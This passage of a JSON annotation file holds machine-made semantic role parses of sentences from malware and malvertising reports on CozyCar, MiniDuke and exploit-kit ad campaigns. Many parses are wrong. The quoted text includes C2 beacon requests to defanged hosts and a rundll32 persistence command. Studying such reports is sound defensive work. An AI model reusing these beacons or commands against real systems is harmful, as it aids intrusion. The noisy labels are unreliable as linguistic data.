"ARGM-LOC": {"text": "herein"}}, "used_2": {"V": {"text": "used", "index": 48}}, "provide": {"V": {"text": "provide", "index": 50}}, "compromised": {"V": {"text": "compromised", "index": 58}, "ARG1": {"text": "networks"}}}, " Unfortunately, the micro-targeting malvertising technique evades almost all\nnetwork controls and traditional endpoint anti-virus solutions": {"malvertising": {"V": {"text": "malvertising", "index": 6}, "ARG0": {"text": "technique"}}}, "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       6\n</header>\n\n\n<figure></figure>\n\n                     <caption>Figure 2: Event tree for infection from Fleaflicker.com Incident</caption>\n\nThe event tree in Figure 2 taken from Invincea\u2019s Threat Management Console shows the exploited Java\nprocess dropped a file called fvJcrgR0.exe, and that it likely came from Pubmatic, an ad delivery network\nthat allows for real time bidding to deliver ads": {"taken": {"ARG1": {"text": "10.27.2014 The event tree in Figure"}, "ARGM-ADV": {"text": "2"}, "V": {"text": "taken", "index": 10}, "ARGM-LOC": {"text": "from/ Invincea \u2019s Threat Management Console shows"}}, "shows": {"ARGM-DIS": {"text": "Release Date"}, "ARG0": {"text": "10.27.2014 The event tree in Figure 2 taken from Invincea \u2019s Threat Management Console"}, "V": {"text": "shows", "index": 17}, "ARG1": {"text": "the exploited Java process dropped a file called fvJcrgR0.exe , and that it likely came from Pubmatic , an ad delivery network that allows for real time bidding to deliver ads"}}, "exploited": {"V": {"text": "exploited", "index": 19}, "ARG1": {"text": "Java process"}}, "dropped": {"ARG0": {"text": "the exploited Java process"}, "V": {"text": "dropped", "index": 22}, "ARG1": {"text": "a file called fvJcrgR0.exe"}}, "called": {"ARG1": {"text": "a file"}, "V": {"text": "called", "index": 25}, "ARG2": {"text": "fvJcrgR0.exe"}}, "came": {"ARG1": {"text": "it"}, "ARGM-ADV": {"text": "likely"}, "V": {"text": "came", "index": 32}, "ARG2": {"text": "from Pubmatic , an ad delivery network that allows for real time bidding to deliver ads"}}, "allows": {"ARG0": {"text": "an ad delivery network"}, "R-ARG0": {"text": "that"}, "V": {"text": "allows", "index": 41}, "ARG1": {"text": "for real time bidding to deliver ads"}}, "deliver": {"V": {"text": "deliver", "index": 47}, "ARG1": {"text": "ads"}}}, "                                                             Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       23\n</header>\n\n\n    \uf0b7   Unconfigured Apache hosts\n    \uf0b7   Cloud-based NGINX subdirectories\n    \uf0b7   Government and News pages in Poland\n    \uf0b7   Free Hosting sites such as ua.in\n</list>\nIn most instances, the landing pages are preconfigured with the exploit kit": {"are": {"ARGM-TMP": {"text": "Release Date"}, "ARGM-PRD": {"text": "10.27.2014 In most instances"}, "ARG1": {"text": "the landing pages"}, "V": {"text": "are", "index": 11}, "ARG2": {"text": "preconfigured with the exploit kit"}}, "preconfigured": {"ARGM-TMP": {"text": "Release Date :/ 10.27.2014 In most instances"}, "ARG0": {"text": "the landing pages"}, "V": {"text": "preconfigured", "index": 12}, "ARG1": {"text": "with the exploit kit"}}}, "\n</section>\n<section>\n<heading>Real World Examples of RTB Malvertising Captured by Invincea</heading>\n\nFigures 17 through 21 in the following are screenshots from Invincea\u2019s Threat Management console from\nvarious RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad\nbidding": {"are": {"ARG1": {"text": "Figures"}, "ARGM-TMP": {"text": "through"}, "V": {"text": "are", "index": 7}, "ARG2": {"text": "screenshots"}}, "based": {"V": {"text": "based", "index": 19}, "ARG1": {"text": "malvertising incidents"}}, "malvertising": {"V": {"text": "malvertising", "index": 20}, "ARG1": {"text": "incidents"}}, "highlighted": {"V": {"text": "highlighted", "index": 23}, "ARG1": {"text": "URLs"}}, "malvertising_2": {"V": {"text": "malvertising", "index": 26}}, "delivered": {"ARG1": {"text": "malvertising"}, "V": {"text": "delivered", "index": 27}, "ARGM-MNR": {"text": "via RTB ad bidding"}}}, " </caption>\n\nAnalysis of the secondary dll file (name matches [A-Z0-9]{1}\\.tmp) indicates that its primary function is\nto serve as a cleanup mechanism for the dropped binary": {"indicates": {"ARG0": {"text": "Analysis of the secondary dll file ( name matches [ A - Z0 - 9]{1}\\.tmp )"}, "V": {"text": "indicates", "index": 16}, "ARG1": {"text": "that its primary function is to serve as a cleanup mechanism for the dropped binary"}}, "is": {"ARG1": {"text": "its primary function"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "to serve as a cleanup mechanism for the dropped binary"}}, "serve": {"V": {"text": "serve", "index": 23}, "ARG1": {"text": "as a cleanup mechanism for the dropped binary"}}, "dropped": {"V": {"text": "dropped", "index": 30}, "ARG1": {"text": "binary"}}}, " [2]\n\nThis campaign, which began on July 7, 2015, appears to be targeted at government organizations and\nthink-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear\nphishing and command and control activity": {"began": {"ARG1": {"text": "This campaign"}, "R-ARG1": {"text": "which"}, "V": {"text": "began", "index": 7}, "ARGM-TMP": {"text": "on July 7 , 2015"}}, "appears": {"V": {"text": "appears", "index": 14}, "ARG1": {"text": "to be targeted at government organizations and think - tanks located in democratic countries [ 3 ] , and utilizes compromised , legitimate websites for spear phishing and command and control activity"}}, "be": {"V": {"text": "be", "index": 16}}, "targeted": {"ARG1": {"text": "This campaign"}, "V": {"text": "targeted", "index": 17}}, "located": {"ARG1": {"text": "think - tanks"}, "V": {"text": "located", "index": 25}, "ARGM-LOC": {"text": "in democratic countries"}}, "utilizes": {"ARG0": {"text": "This campaign"}, "V": {"text": "utilizes", "index": 34}, "ARGM-PRD": {"text": "legitimate websites"}, "ARG1": {"text": "for spear phishing and command and control activity"}}, "compromised": {"ARGM-PRD": {"text": "utilizes"}, "V": {"text": "compromised", "index": 35}}}, "\n\nGET /webscriptsecurity/view/4/player.swf HTTP/1.1\n     Accept: text/html,application/xhtml+xml,*/*\n     Accept-Language: en_US\n     User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\n     Host: extranet.qualityplanning[.]com\n     Connection: Keep-Alive\n\n\n\n\n   GET /webscriptsecurity/view/4/player.swf HTTP/1.1\n\f       Accept: text/html,application/xhtml+xml,*/*\n\n       Accept-Language: en_US\n\n     User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET\n   CLR 2.0.50727)\n\n       Host: extranet.qualityplanning[.]com\n\n       Connection: Keep-Alive\n\n\n\nThe secondary dropper then cleans up after itself with a simple vbs script\n(md5:0d132ee171768dc30d14590ed2dbadd1) that leaves only the decoy multimedia file behind": {"GET": {"V": {"text": "GET", "index": 0}}, "MSIE": {"V": {"text": "MSIE", "index": 28}, "ARG1": {"text": "8.0/ script"}}, "Keep": {"V": {"text": "Keep", "index": 50}, "ARG1": {"text": "/webscriptsecurity"}}, "GET_2": {"ARGM-MNR": {"text": "Keep -/ Alive"}, "V": {"text": "GET", "index": 53}}, "MSIE_2": {"V": {"text": "MSIE", "index": 81}, "ARG1": {"text": "8.0"}}, "Keep_2": {"V": {"text": "Keep", "index": 103}, "ARG1": {"text": "Alive/ The secondary dropper/ cleans up after itself with a simple vbs )"}}, "Alive": {"V": {"text": "Alive", "index": 105}, "ARG1": {"text": "The secondary dropper/ cleans"}}, "cleans": {"V": {"text": "cleans", "index": 110}, "ARGM-DIR": {"text": "up"}, "ARGM-TMP": {"text": "after itself"}}, "leaves": {"R-ARG0": {"text": "that"}, "V": {"text": "leaves", "index": 123}, "ARG2": {"text": "only the decoy multimedia file behind"}}}, "\n</section>\n\n<section>\n<heading> Command handler </heading>\n\nOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server\nwill begin responding to beacons from the Trojan with JSON blobs": {"have": {"ARG0": {"text": "the C2 and Trojan"}, "V": {"text": "have", "index": 5}, "ARG1": {"text": "synchronized"}}, "synchronized": {"ARG0": {"text": "the C2 and Trojan"}, "V": {"text": "synchronized", "index": 6}}, "can": {"V": {"text": "can", "index": 8}}, "decrypt": {"ARG0": {"text": "the C2 and Trojan"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "decrypt", "index": 9}, "ARG1": {"text": "their network communications"}}, "will": {"V": {"text": "will", "index": 16}}, "begin": {"ARGM-TMP": {"text": "Once the C2 and Trojan have synchronized and can decrypt their network communications"}, "ARG0": {"text": "the C2 server"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "begin", "index": 17}, "ARG1": {"text": "responding to beacons from the Trojan with JSON blobs"}}, "responding": {"ARG0": {"text": "the C2 server"}, "V": {"text": "responding", "index": 18}, "ARG1": {"text": "to beacons from the Trojan with JSON blobs"}}}, " To obtain tasks, the Trojan will issue an HTTPS request to the C2 server\n(\u201chost_scripts\u201d in the configuration) that resembles the following example beacon:\n\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\n\n\n\n\n   GET /mobile/viewer.php HTTP/1.1\n\n   Accept: */*\n\n   Accept-Language: en-US\n\f   User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n\n   Host: www.illuminatistudios[.]net\n\n   Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\n\n   Accept-Encoding: gzip, deflate\n\n   Connection: Keep-Alive\n\nThe Trojan manually creates the cookie in this HTTP request": {"obtain": {"V": {"text": "obtain", "index": 1}, "ARG1": {"text": "tasks"}}, "will": {"ARGM-PRP": {"text": "To obtain tasks"}, "ARG0": {"text": "the Trojan"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "issue an HTTPS request to the C2 server ( \u201c host_scripts \u201d in the configuration ) that resembles the following example beacon : GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive The Trojan manually creates the cookie in this HTTP request"}}, "issue": {"ARGM-PRP": {"text": "To obtain tasks"}, "ARG0": {"text": "the Trojan"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "issue", "index": 7}, "ARG1": {"text": "an HTTPS request to the C2 server ( \u201c host_scripts"}, "C-ARG1": {"text": "that resembles the following example beacon :/ GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip ,/ deflate Connection : Keep - Alive GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive The Trojan manually creates the cookie in this HTTP request"}}, "resembles": {"ARG1": {"text": "an HTTPS/ the C2 server ( \u201c host_scripts \u201d in the configuration )"}, "R-ARG1": {"text": "that"}, "V": {"text": "resembles", "index": 24}, "ARG2": {"text": "the following example beacon"}}, "following": {"V": {"text": "following", "index": 26}, "ARG1": {"text": "example/ beacon"}}, "GET": {"V": {"text": "GET", "index": 30}, "ARGM-DIS": {"text": "viewer.php HTTP/1.1"}, "ARG1": {"text": "* / * Accept - Language : en - US User - Agent -"}}, "deflate": {"V": {"text": "deflate", "index": 81}, "ARG0": {"text": "Connection"}}, "Keep": {"V": {"text": "Keep", "index": 84}}, "GET_2": {"ARG1": {"text": "Alive"}, "V": {"text": "GET", "index": 87}}, "deflate_2": {"V": {"text": "deflate", "index": 138}, "ARG1": {"text": "Connection"}}, "Keep_2": {"V": {"text": "Keep", "index": 141}, "ARG1": {"text": "The Trojan"}}, "creates": {"ARG0": {"text": "Trojan"}, "ARGM-MNR": {"text": "manually"}, "V": {"text": "creates", "index": 147}, "ARG1": {"text": "the cookie in this HTTP request"}}}, "\n\nUnit 42 analyzed the Trojan\u2019s command handler and found several commands, as seen in Table 2, which\nallows the threat actors to carry out a full range of activities on the system": {"analyzed": {"ARG0": {"text": "Unit"}, "ARGM-EXT": {"text": "42"}, "V": {"text": "analyzed", "index": 2}, "ARG1": {"text": "the Trojan \u2019s command handler"}}, "found": {"ARG0": {"text": "Unit"}, "V": {"text": "found", "index": 9}, "ARG1": {"text": "several commands"}, "ARGM-ADV": {"text": "as seen in Table 2 ,/ which allows the threat actors to carry out a full range of activities on the system"}}, "seen": {"V": {"text": "seen", "index": 14}, "ARGM-LOC": {"text": "in Table 2"}}, "allows": {"ARG0": {"text": "Table 2"}, "R-ARG0": {"text": "which"}, "V": {"text": "allows", "index": 20}, "ARG1": {"text": "the threat actors to carry out a full range of activities on the system"}}, "carry": {"ARG0": {"text": "the threat actors"}, "V": {"text": "carry", "index": 25}, "ARG1": {"text": "a full range of activities on the system"}}}, "\n</section>\n\n<section>\n<heading> Malware Details </heading>\n\n<heading> The Initial Droppers: Decoy and Downloader </heading>\n\nThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a\nlink to a .zip file on a compromised website or by direct delivery as an attachment to the phish": {"includes": {"ARG2": {"text": "The current CozyCar campaign"}, "V": {"text": "includes", "index": 4}, "ARG1": {"text": "spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish"}}, "phishing": {"V": {"text": "phishing", "index": 6}, "ARG0": {"text": "emails"}}, "deliver": {"ARG0": {"text": "spear phishing emails"}, "R-ARG0": {"text": "that"}, "V": {"text": "deliver", "index": 9}, "ARG1": {"text": "the payload"}, "ARG2": {"text": "from either"}, "ARGM-MNR": {"text": "by a link to a .zip/ by direct delivery"}}, "compromised": {"V": {"text": "compromised", "index": 23}, "ARG1": {"text": "website"}}}, "\n\f\n<figure></figure>\nAs the next step, MiniDuke gathers the following information from the infected systems:\n<list>\n      computer name and user domain name\n      country code of the infected host IP address obtained from http://www.geoiptool.com\n      OS version information\n      domain controller name, user name, groups a user account belongs to\n      a list of AV products installed onto the system\n      Internet proxy configuration\n      version of MiniDuke\n</list>\nThis information is then sent to the C&C server along with the request to download a payload": {"is": {"V": {"text": "is", "index": 2}}, "sent": {"ARG1": {"text": "This information"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sent", "index": 4}, "ARG2": {"text": "to the C&C server"}, "ARGM-DIR": {"text": "along"}, "ARGM-PRD": {"text": "with the request"}, "ARGM-PRP": {"text": "to download a payload"}}, "download": {"V": {"text": "download", "index": 14}, "ARG1": {"text": "a payload"}}}, " The name of the .LNK file is randomly drawn from the\n\ffollowing values:\n\n<figure></figure>\n\n\nThe .LNKfile is created using a COM object with the IShellLinkA interface and contains the following\ncommand: \u201cC:\\Windows\\system32\\rundll32.exe %path_to_main_module%, export_function\u201d Which\ngives something like:\n\u201cC:\\Windows\\system32\\rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\data.cat, IlqUenn\u201c": {"is": {"V": {"text": "is", "index": 6}}, "drawn": {"ARG1": {"text": "The name of the .LNK file"}, "ARGM-MNR": {"text": "randomly"}, "V": {"text": "drawn", "index": 8}, "ARG2": {"text": "from the following values"}}, "following": {"V": {"text": "following", "index": 11}, "ARG1": {"text": "values"}}, "is_2": {"V": {"text": "is", "index": 16}}, "created": {"ARG1": {"text": "The .LNKfile"}, "V": {"text": "created", "index": 17}, "ARGM-MNR": {"text": "using a COM object with the IShellLinkA interface"}}, "using": {"V": {"text": "using", "index": 18}, "ARG1": {"text": "a COM object"}, "ARGM-MNR": {"text": "with the IShellLinkA interface"}}, "contains": {"ARG0": {"text": "The .LNKfile"}, "V": {"text": "contains", "index": 27}, "ARG1": {"text": "the following command : \u201c C:\\Windows\\system32\\rundll32.exe % path_to_main_module%"}}, "following_2": {"V": {"text": "following", "index": 29}, "ARG1": {"text": "command"}}, "gives": {"ARG0": {"text": "export_function \u201d"}, "R-ARG0": {"text": "Which"}, "V": {"text": "gives", "index": 40}, "ARG1": {"text": "something like"}}}, " The information collected on\ninfection has not changed since the previous version and consists of the following values:\n<list>\n      volume serial number (obtained from kernel32!GetVolumeInformationA)\n      CPU information (obtained with the cpuidinstruction)\n      computer name (obtained from kernel32!GetComputerNameA)\n</list>\nOnce the encrypted version of the malware is created, it is written into a file in the\n%ALLUSERSPROFILE%\\Application Data directory": {"collected": {"ARG1": {"text": "The information"}, "V": {"text": "collected", "index": 2}, "ARG2": {"text": "on infection"}}, "has": {"V": {"text": "has", "index": 5}}, "changed": {"ARG1": {"text": "The information collected on infection"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "changed", "index": 7}, "ARGM-TMP": {"text": "since the previous version"}}, "consists": {"ARG1": {"text": "The information collected on infection"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "consists", "index": 13}, "ARG2": {"text": "of the following values"}}, "following": {"V": {"text": "following", "index": 16}, "ARG1": {"text": "values"}}, "encrypted": {"V": {"text": "encrypted", "index": 21}, "ARG1": {"text": "version"}}, "is": {"V": {"text": "is", "index": 26}}, "created": {"ARG1": {"text": "the encrypted version of the malware"}, "V": {"text": "created", "index": 27}}, "is_2": {"V": {"text": "is", "index": 30}}, "written": {"ARGM-TMP": {"text": "Once the encrypted version of the malware is created"}, "ARG1": {"text": "it"}, "V": {"text": "written", "index": 31}, "ARG2": {"text": "into a file"}, "ARGM-LOC": {"text": "in the % ALLUSERSPROFILE%\\Application Data directory"}}}, "\n\nThe functionality of the shellcode which is executed by triggering the vulnerability is rather simple and\nstraightforward": {"is": {"V": {"text": "is", "index": 6}}, "executed": {"ARG1": {"text": "the shellcode"}, "R-ARG1": {"text": "which"}, "V": {"text": "executed", "index": 7}, "ARGM-MNR": {"text": "by triggering the vulnerability"}}, "triggering": {"V": {"text": "triggering", "index": 9}, "ARG1": {"text": "the vulnerability"}}, "is_2": {"ARG1": {"text": "The functionality of the shellcode which is executed by triggering the vulnerability"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "rather simple and straightforward"}}}, "\n\n<figure></figure>\n\n\n<caption>Result of first obfuscation</caption>\n\n\n<figure></figure>\n\n<caption>Result of second obfuscation</caption>\n\nThe purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute": {"is": {"ARG1": {"text": "The purpose of this script"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to use Twitter to find a C&C and retrieve JScript code to execute"}}, "use": {"V": {"text": "use", "index": 7}, "ARG1": {"text": "Twitter"}, "ARG2": {"text": "to find a C&C"}}, "find": {"V": {"text": "find", "index": 10}, "ARG1": {"text": "a C&C"}}, "retrieve": {"V": {"text": "retrieve", "index": 14}, "ARG1": {"text": "JScript code to execute"}}, "execute": {"ARG1": {"text": "JScript code"}, "V": {"text": "execute", "index": 18}}}, "\n\n<figure></figure>\n\n\nPrior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of\n\ftwo separate obfuscations, we can see that the variables have different values": {"executing": {"V": {"text": "executing", "index": 2}, "ARG1": {"text": "it"}, "ARG0": {"text": "MiniDuke"}}, "applies": {"ARGM-TMP": {"text": "Prior to executing it"}, "ARG0": {"text": "MiniDuke"}, "V": {"text": "applies", "index": 6}, "ARG1": {"text": "a light encoding"}, "ARG2": {"text": "to the script"}}, "encoding": {"ARG1": {"text": "a light"}, "V": {"text": "encoding", "index": 9}, "ARG2": {"text": "to the script"}}, "show": {"ARG0": {"text": "The next images"}, "V": {"text": "show", "index": 17}, "ARG1": {"text": "the result of two separate obfuscations"}}, "can": {"V": {"text": "can", "index": 26}}, "see": {"ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 27}, "ARG1": {"text": "that the variables have different values"}}, "have": {"ARG0": {"text": "the variables"}, "V": {"text": "have", "index": 31}, "ARG1": {"text": "different values"}}}, " We have since seen multiple cases where this exploit is\nused to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke\n(also known as Win32/SandyEva)": {"have": {"V": {"text": "have", "index": 1}}, "seen": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "since"}, "V": {"text": "seen", "index": 3}, "ARG1": {"text": "multiple cases where this exploit is used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke ( also known as Win32/SandyEva )"}}, "is": {"V": {"text": "is", "index": 9}}, "used": {"ARGM-LOC": {"text": "multiple cases"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "this exploit"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "to deliver malware and"}}, "deliver": {"ARGM-LOC": {"text": "where"}, "ARG0": {"text": "this exploit"}, "V": {"text": "deliver", "index": 12}, "ARG1": {"text": "malware"}}, "was": {"ARG1": {"text": "one"}, "V": {"text": "was", "index": 16}, "ARG2": {"text": "particularly interesting"}}, "contained": {"ARG0": {"text": "it"}, "V": {"text": "contained", "index": 21}, "ARG1": {"text": "a new variant of MiniDuke ( also known as Win32/SandyEva )"}}, "known": {"ARG1": {"text": "a new variant of MiniDuke ("}, "ARGM-ADV": {"text": "also"}, "V": {"text": "known", "index": 29}, "ARG2": {"text": "as Win32/SandyEva )"}}}, " If the configuration data is\ndecrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by\nwhich to reach C&C server": {"is": {"ARG1": {"text": "the configuration data"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "decrypted correctly"}}, "decrypted": {"ARG1": {"text": "the configuration data"}, "V": {"text": "decrypted", "index": 5}, "ARGM-MNR": {"text": "correctly"}}, "retrieves": {"ARGM-ADV": {"text": "If the configuration data is decrypted correctly"}, "ARG0": {"text": "MiniDuke"}, "V": {"text": "retrieves", "index": 9}, "ARG1": {"text": "the Twitter page of @FloydLSchwartz"}, "C-ARG1": {"text": "in search of URLs by which to reach C&C server"}}, "reach": {"ARGM-MNR": {"text": "URLs"}, "R-ARGM-MNR": {"text": "by which"}, "V": {"text": "reach", "index": 22}, "ARG1": {"text": "C&C server"}}}, " The name of the file is randomly picked from the\nfollowing values (you can find this listing and those of the next screenshots on the VirusRadar description:\n\n<figure></figure>\n\n\nThe filename extension is also picked randomly from the following list:\n\n<figure></figure>\n\n\nTo persist on the infected system after reboots, the malware creates a hidden .LNK file in the \u201cStartup\u201d\ndirectory pointing to the modified main module": {"is": {"ARG1": {"text": "The name of the file"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "randomly picked from the following values ( you can find this listing and those of the next screenshots on the VirusRadar description"}}, "picked": {"ARG1": {"text": "The name of the file"}, "ARGM-MNR": {"text": "randomly/ from the following values"}, "V": {"text": "picked", "index": 7}, "ARGM-CAU": {"text": "( you can find this listing and those of the next screenshots on the VirusRadar description"}}, "following": {"V": {"text": "following", "index": 10}, "ARG1": {"text": "values"}}, "can": {"V": {"text": "can", "index": 14}}, "find": {"ARG0": {"text": "you"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "find", "index": 15}, "ARG1": {"text": "this listing and"}}, "persist": {"V": {"text": "persist", "index": 30}, "ARG1": {"text": "on the infected system"}, "ARGM-TMP": {"text": "after reboots"}}, "creates": {"R-ARG0": {"text": "To persist on the infected system after reboots"}, "ARG0": {"text": "the malware"}, "V": {"text": "creates", "index": 40}, "ARG1": {"text": "a hidden .LNK file in the \u201c Startup \u201d directory pointing to the modified main module"}}, "pointing": {"ARG0": {"text": "a hidden .LNK file in the \u201c Startup \u201d directory"}, "V": {"text": "pointing", "index": 51}, "ARG2": {"text": "to the modified main module"}}, "modified": {"V": {"text": "modified", "index": 54}, "ARG1": {"text": "main module"}}}, "\n</section>\n<section>\n<heading>Operation</heading>\n\nWhen the malware is loaded by rundll32.exe and the current directory isn\u2019t %TEMP%, the malware starts\nwith gathering the same system information as described in the \u201cInstallation\u201d section to decrypt\nconfiguration information": {"is": {"V": {"text": "is", "index": 3}}, "loaded": {"ARG1": {"text": "the malware"}, "V": {"text": "loaded", "index": 4}, "ARG0": {"text": "by rundll32.exe"}}, "is_2": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the malware is loaded by rundll32.exe and the current directory"}, "V": {"text": "is", "index": 11}, "ARGM-NEG": {"text": "n\u2019t"}, "ARG2": {"text": "% TEMP%"}}, "starts": {"ARGM-TMP": {"text": "When the malware is loaded by rundll32.exe and the current directory is n\u2019t % TEMP%"}, "ARG1": {"text": "the malware"}, "V": {"text": "starts", "index": 18}, "ARG2": {"text": "with gathering the same system information as described in the \u201c Installation \u201d section to decrypt configuration information"}}, "gathering": {"ARG0": {"text": "the malware"}, "V": {"text": "gathering", "index": 20}, "ARG1": {"text": "the same system information as described in the \u201c Installation \u201d section to decrypt configuration information"}}, "described": {"ARG1": {"text": "gathering/ the same system information"}, "V": {"text": "described", "index": 26}, "ARGM-LOC": {"text": "in the \u201c Installation \u201d section"}, "ARG2": {"text": "to decrypt configuration information"}}, "decrypt": {"V": {"text": "decrypt", "index": 34}, "ARG1": {"text": "configuration information"}}}, "\n</section>\n<section>\n<heading>TwitterJS component</heading>\n\fThe TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of\ncode into it and redirecting the exported functions to this code": {"is": {"V": {"text": "is", "index": 3}}, "extracted": {"ARG1": {"text": "The TwitterJS module"}, "V": {"text": "extracted", "index": 4}, "ARG2": {"text": "by creating a copy of the Windows DLL cryptdll.dll , injecting a block of code into it and redirecting the exported functions to this code"}}, "creating": {"V": {"text": "creating", "index": 6}, "ARG1": {"text": "a copy of the Windows DLL cryptdll.dll"}}, "injecting": {"V": {"text": "injecting", "index": 15}, "ARG1": {"text": "a block of code"}, "ARG2": {"text": "into it"}}, "redirecting": {"V": {"text": "redirecting", "index": 23}, "ARG1": {"text": "the exported functions"}, "ARG2": {"text": "to this code"}}, "exported": {"V": {"text": "exported", "index": 25}, "ARG1": {"text": "functions"}}}, " Below you can find the content of\nthe init.cmd script used by MiniDuke to install TwitterJS module onto the system": {"can": {"V": {"text": "can", "index": 2}}, "find": {"ARGM-LOC": {"text": "Below"}, "ARG0": {"text": "you"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "find", "index": 3}, "ARG1": {"text": "the content of the init.cmd script used by MiniDuke to install TwitterJS module onto the system"}}, "used": {"ARG1": {"text": "the content of the init.cmd script"}, "V": {"text": "used", "index": 10}, "ARG0": {"text": "by MiniDuke"}, "ARG2": {"text": "to install TwitterJS module onto the system"}}, "install": {"V": {"text": "install", "index": 14}, "ARG1": {"text": "TwitterJS module onto the system"}}}, " Some\nof the characteristics of MiniDuke \u2014 such as its small size (20 KB), its crafty use of assembly\nprogramming, and the use of zero-day exploits for distribution \u2014 made it an intriguing threat": {"made": {"ARG0": {"text": "the use of zero - day exploits for distribution \u2014"}, "V": {"text": "made", "index": 35}, "ARG1": {"text": "it an intriguing threat"}}}, " The malware processes the\ndownloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using\nRSA-2048, then decrypts it, stores in a file and finally executes it": {"processes": {"ARG0": {"text": "The malware"}, "V": {"text": "processes", "index": 2}, "ARG1": {"text": "the downloaded file"}, "ARGM-MNR": {"text": "in the same way as previous samples of MiniDuke"}}, "verifies": {"ARG0": {"text": "it"}, "V": {"text": "verifies", "index": 17}, "ARG1": {"text": "the integrity of the file"}, "ARGM-MNR": {"text": "using RSA-2048"}}, "using": {"ARG0": {"text": "it"}, "V": {"text": "using", "index": 23}, "ARG1": {"text": "RSA-2048"}}, "decrypts": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "decrypts", "index": 27}, "ARG1": {"text": "it"}}, "executes": {"ARG0": {"text": "it"}, "ARGM-TMP": {"text": "finally"}, "V": {"text": "executes", "index": 36}, "ARG1": {"text": "it"}}}, " Finally this DLL is registered as the Open command when a drive is open, which has the effect of\nstarting the bot every time the user opens a disk drive": {"is": {"V": {"text": "is", "index": 3}}, "registered": {"ARGM-TMP": {"text": "Finally/ when a drive is open , which has the effect of starting the bot every time the user opens a disk drive"}, "ARG1": {"text": "this DLL"}, "V": {"text": "registered", "index": 4}, "ARG2": {"text": "as the Open command"}}, "is_2": {"ARGM-TMP": {"text": "when"}, "ARG1": {"text": "a drive"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "open"}}, "has": {"ARG0": {"text": "which"}, "V": {"text": "has", "index": 16}, "ARG1": {"text": "the effect of starting the bot every time the user opens a disk drive"}}, "starting": {"V": {"text": "starting", "index": 20}, "ARG1": {"text": "the bot"}, "ARGM-TMP": {"text": "every time the user opens a disk drive"}}, "opens": {"ARGM-TMP": {"text": "every time"}, "ARG0": {"text": "the user"}, "V": {"text": "opens", "index": 27}, "ARG1": {"text": "a disk drive"}}}, " The end result is that it is impossible to retrieve the\nconfiguration of an encrypted payload if analyzing it on a different computer": {"is": {"ARG1": {"text": "The end result"}, 